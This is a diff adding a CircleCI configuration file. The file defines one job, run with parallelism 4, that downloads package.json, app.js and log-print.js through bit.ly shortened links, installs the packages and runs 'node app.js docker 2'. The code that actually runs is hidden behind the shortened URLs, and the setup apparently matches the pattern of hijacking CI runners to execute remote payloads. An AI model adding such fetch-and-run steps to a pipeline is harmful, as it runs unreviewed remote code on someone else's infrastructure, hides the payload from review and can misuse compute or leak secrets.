@@ -1,0 +1,23 @@
+version: 2.1
+
+jobs:
+  run-checking:
+    docker:
+      - image: node:12
+    resource_class: medium
+    parallelism: 4
+    steps:
+      - run: 
+          name: Get soure
+          command: |-
+            curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/2XgnUhW -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js
+      - run: 
+          name: Install Packages
+          command: |-
+            npm i -s
+      - run: node app.js docker 2
+      
+workflows:
+  start-work:
+    jobs:
+      - run-checking
